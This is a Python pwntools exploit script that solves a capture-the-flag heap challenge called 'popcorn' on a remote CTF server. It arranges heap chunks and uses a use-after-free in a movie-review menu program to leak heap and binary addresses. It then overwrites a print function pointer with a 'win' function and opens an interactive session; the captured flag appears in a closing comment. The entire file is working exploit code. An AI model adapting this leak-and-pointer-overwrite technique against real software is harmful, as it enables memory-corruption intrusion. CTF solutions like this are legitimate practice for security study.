import pwn
import warnings

warnings.filterwarnings(action='ignore', category=BytesWarning)


elf = pwn.ELF("./popcorn_patched")
pwn.context.binary = elf
pwn.context.log_level = "DEBUG"
pwn.context(terminal=['tmux', 'split-window', '-h'])

# libc = elf.libc
# p = elf.process()
p = pwn.remote("netcat.deadsec.quest", "31985")
libc = pwn.ELF("./libc.so.6")

# Create Movie
p.sendlineafter(">", "1")
p.sendlineafter(">", "movie1")


def add_review(l, review):
    p.sendlineafter(">", "2")  # menu
    p.sendlineafter(">", "0")  # movie index
    p.sendlineafter(">", "2")  # create index
    p.sendlineafter(">", str(l))  # review length
    p.sendlineafter(">", "n")  # rating
    p.sendlineafter(">", review)  # review


def delete_review(index):
    p.sendlineafter(">", "2")  # menu
    p.sendlineafter(">", "0")  # movie index
    p.sendlineafter(">", "4")  # create index
    p.sendlineafter(">", str(index))  # review length


for i in range(10):
    add_review(0x20, f"AAAA{i}")

delete_review(9)
delete_review(8)
delete_review(7)
delete_review(6)
delete_review(5)
delete_review(4)

delete_review(2)
delete_review(3)

# Create UAF Movie
p.sendlineafter(">", "1")
p.sendlineafter(">", b"\x00" * 0x10 + pwn.p64(0xFF) + b"SPICY")

# review_count += 1
add_review(0x20, "SPICY_TARGET")
delete_review(1)

# Edit movie to leak title
p.sendlineafter(">", "2")  # edit
p.sendlineafter(">", "2")  # movie index

p.recvuntil("movie: ")

heap_leak = pwn.u64(p.recv(6).ljust(8, b"\x00"))
print(f"{hex(heap_leak)=}")
p.sendlineafter(">", "4")
p.sendlineafter(">", "0")

# Edit review to set movie-> next to get another leak
p.sendlineafter(">", "2")
p.sendlineafter(">", "0")
p.sendlineafter(">", "3")
p.sendlineafter(">", "2")
p.sendlineafter(">", pwn.p64((heap_leak & 0xFFFFFFFFFFFFF000) + 0x2F8))

# Leak Title
p.sendlineafter(">", "2")  # edit
p.sendlineafter(">", "3")  # movie index
p.recvuntil("movie: ")
elf_leak = pwn.u64(p.recv(6).ljust(8, b"\x00"))
print(f"{hex(elf_leak)=}")
p.sendlineafter(">", "4")
p.sendlineafter(">", "0")

elf.address = elf_leak - (0x17D8)
print(f"{hex(elf.address)=}")

win_addr = elf.address + 0x1339
print(f"{hex(win_addr)=}")

# Set print function to win_addr
p.sendlineafter(">", "2")
p.sendlineafter(">", "2")
p.sendlineafter(">", "1")
p.sendlineafter(">", pwn.p64(0) + pwn.p64(win_addr))

# elf_addr = leak - (0x55DD2A472610 - 0x55DD295B3000)
# print(f"{hex(elf_addr)=}")

# Print Movies

p.sendlineafter(">", "5")
p.interactive()

# dead{wh3n_p0pp1ng_c0rn_r3m3mb3r_t0_cl34n_up!}
